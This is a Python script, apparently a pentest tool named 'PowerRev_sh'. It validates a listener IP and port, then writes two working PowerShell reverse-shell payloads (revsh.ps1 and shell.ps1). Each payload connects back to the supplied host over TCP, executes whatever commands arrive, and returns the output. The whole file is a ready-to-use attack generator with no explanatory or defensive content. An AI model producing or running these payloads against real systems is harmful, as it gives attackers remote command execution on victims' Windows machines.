#!/usr/bin/python3

import os
import subprocess
import sys
import re

def usage():

    if len(sys.argv) != 3:
        print("[!]More need arguments...")
        print(f"{sys.argv[0]} <lhost> <port>")
        sys.exit()


def ip_checks(lhost):

    ng_msg = "NG"

    reg = re.match("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$",lhost)

    if reg:
        return lhost

    else:
        return ng_msg 


def port_checks(lport):

    ng_msg = "NG"

    reg = re.match(r"^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$",lport)

    if reg:
        return lport
    else:
        return ng_msg



def init():
    logo = """
 ____                         ____                  _     
|  _ \ _____      _____ _ __ |  _ \ _____   __  ___| |__  
| |_) / _ \ \ /\ / / _ \ '__|| |_) / _ \ \ / / / __| '_ \ 
|  __/ (_) \ V  V /  __/ |   |  _ <  __/\ V /  \__ \ | | |
|_|   \___/ \_/\_/ \___|_|___|_| \_\___| \_/___|___/_| |_|
                        |_____|           |_____|         
    """
    print(logo)
        
    usage()

    lhost = sys.argv[1]
    lport = sys.argv[2]

    lhost = ip_checks(lhost)
    lport = port_checks(lport)
    
    if lhost != "NG" and lport != "NG":
        print("[+]CLEAR")
        return lhost,lport

    else:
        print("[!]Maybe ip or port is wrong")
        print("[*]ip: [1-255]\.[1-255]\.[1-255]\.[1-255]")
        print("[*]port: [1-65535]")
        sys.exit()

def craft(lhost,lport):

    print(f"[+]Lhost: {lhost}")
    print(f"[+]Lport: {lport}")

    pwsh_script = """$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""
    pwsh_script = pwsh_script.replace("{lhost}",lhost)
    pwsh_script = pwsh_script.replace("{lport}",lport)

    #print("File Created Name: revsh.ps1")
    
    f = open("revsh.ps1","w")
    f.write(pwsh_script)
    f.close()

    print("[+]File Created [Name: revsh.ps1]")

    pwsh_script = """
$socket = new-object System.Net.Sockets.TcpClient("{lhost}",{lport});
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("[spidersec]> ");
	$writer.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split()
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $writer.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$writer.close();$socket.close();
    """

    pwsh_script = pwsh_script.replace("{lhost}",lhost)
    pwsh_script = pwsh_script.replace("{lport}",lport)

    f = open("shell.ps1","w")
    f.write(pwsh_script)
    f.close()

    print("[+]File Created [Name: shell.ps1]")



def main():

    lhost,lport = init()
    craft(lhost,lport)


if __name__ == "__main__":
    main()

